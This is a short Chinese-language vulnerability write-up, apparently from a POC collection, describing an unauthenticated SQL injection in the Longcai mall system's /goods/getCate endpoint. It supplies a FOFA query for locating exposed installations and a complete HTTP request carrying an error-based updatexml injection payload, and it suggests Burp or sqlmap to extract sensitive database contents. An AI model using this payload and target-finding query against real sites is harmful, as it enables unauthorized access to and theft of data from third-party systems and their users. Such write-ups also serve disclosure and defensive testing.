# 龙采商城系统后台/goods/getcate存在SQL注入

### 一、漏洞描述
龙采科技集团有限责任公司龙采商城系统后台/goods/getCate接口存在未授权SQL注入，可直接暴露出数据库敏感信息。

### 二、影响版本
龙采商城系统

### 三、资产测绘
FOFA：body="'url':'/pc2.0/index/index'"

![1715916044415-70ff5169-8fd9-48e0-8c05-91ac458ccde4.png](./img/GOhx3tRoZc_7z5pI/1715916044415-70ff5169-8fd9-48e0-8c05-91ac458ccde4-841370.png)

### 四、漏洞复现
```plain
POST /goods/getCate HTTP/2
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 65

id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)&keyword=
```

使用burp请求POC即可暴出敏感数据库（也可以采用sqlmap跑出大量敏感信息）

![1715916319450-8e51a0ec-7878-4d2d-a04f-c7cc9af69340.png](./img/GOhx3tRoZc_7z5pI/1715916319450-8e51a0ec-7878-4d2d-a04f-c7cc9af69340-172677.png)



> 更新: 2024-06-01 11:14:23  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dyk2it32v9mtbdqw>